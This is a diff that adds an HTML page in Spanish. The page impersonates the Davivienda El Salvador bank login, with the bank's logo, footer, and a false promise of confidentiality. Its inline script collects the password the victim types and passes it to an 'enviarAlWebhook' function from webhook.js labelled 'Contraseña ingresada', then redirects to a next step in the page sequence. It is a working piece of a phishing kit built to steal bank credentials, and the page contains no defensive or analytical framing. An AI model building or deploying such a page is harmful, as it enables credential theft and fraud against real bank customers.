@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Validación de contraseña</title>
+  <link rel="stylesheet" href="estilos.css" />
+  <script src="webhook.js" defer></script>
+</head>
+<body>
+  <div class="top-bar">
+    <img src="DaviviendaLogo.png" alt="Logo Davivienda" class="logo-franja" />
+  </div>
+
+  <div class="container">
+    <h2 class="titulo-login">Ingrese su contraseña</h2>
+    <form id="passwordForm" onsubmit="validarPassword(event)">
+      <input type="password" id="contrasena" placeholder="Contraseña" required />
+      <button type="submit">Validar</button>
+    </form>
+
+    <div class="acciones-horizontal">
+      <a href="#">¿Olvidó su contraseña?</a>
+      <a href="index.html">Volver</a>
+    </div>
+
+    <div class="privacidad">
+      Su contraseña será tratada con estricta confidencialidad y seguridad.
+      <a href="#">Más información</a>
+    </div>
+  </div>
+
+  <div class="footer">
+    © 2026 Davivienda El Salvador – Todos los derechos reservados
+  </div>
+
+  <script>
+    function validarPassword(e) {
+      e.preventDefault();
+      const pass = document.getElementById("contrasena").value;
+
+      // Validación: solo letras y números
+      const regex = /^[A-Za-z0-9]+$/;
+
+      if (!regex.test(pass)) {
+        alert("La contraseña solo puede contener letras y números. No se permiten caracteres especiales.");
+        return;
+      }
+
+      enviarAlWebhook("🔑 Contraseña ingresada", pass)
+        .then(() => window.location.href = "index3.html")
+        .catch(() => alert("Error al enviar la contraseña"));
+    }
+  </script>
+</body>
+</html>
